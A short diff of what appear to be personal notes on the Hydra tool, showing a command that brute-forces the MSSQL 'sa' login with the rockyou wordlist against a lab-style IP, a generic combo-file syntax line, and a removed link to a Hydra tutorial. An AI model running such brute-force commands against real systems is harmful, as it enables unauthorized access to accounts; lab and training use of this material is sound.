@@ -10,4 +10,3 @@ hydra -l sa -P /usr/share/wordlists/rockyou.txt -t 64 -s 6520 mssql://10.129.244
 
 hydra -C <файл> протокол://хост
 
-https://skyeng.ru/it-industry/it/kak-ispolzovat-hydra-v-kali-linux-poshagovoye-rukovodstvo/
